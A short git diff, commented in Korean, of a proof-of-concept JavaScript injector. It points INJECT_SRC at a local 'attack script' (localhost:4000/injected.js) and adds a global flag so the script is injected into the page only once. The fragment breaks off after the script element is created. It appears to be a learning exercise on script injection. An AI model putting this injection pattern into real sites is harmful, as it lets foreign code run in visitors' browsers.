@@ -1,8 +1,6 @@
 const statusEl = document.getElementById("status");//id=status 상태체크용 객체 생성(상태창 같은 놈임)
 const INJECT_SRC = "http://localhost:4000/injected.js";//공격 스크립트의 주소
 
-let injected = false;//스크립트가 중복으로 심어질 수도 있어서 플래그 생성했습니다.
-
 //id=status인 객체가 있는지 확인하고 계속해서 객체의 상태메시지를 최신화 하는 용도
 function setStatus(msg) {
   if (statusEl) statusEl.textContent = msg;
@@ -11,8 +9,11 @@ function setStatus(msg) {
 //스크립트를 주입해두는 함수, 실행은 브라우저가 하는 거임(DOM 기반 탐색이 필요한 이유)
 function injectOnce() {
   //중복주입 방지
-  if (injected) return;
-  injected = true;
+  if (window.__POC_INJECTED__) {
+    console.log("이미 전역에 주입 기록이 존재합니다.");
+    return;
+  }
+  window.__POC_INJECTED__ = true;//F12에서 스크립트가 주입된 상태인지 확인하기에도 좋겠네요.
 
   //script 객체 생성(엄밀히 말하면 injected.js가 들어간 객체)
   const s = document.createElement("script");
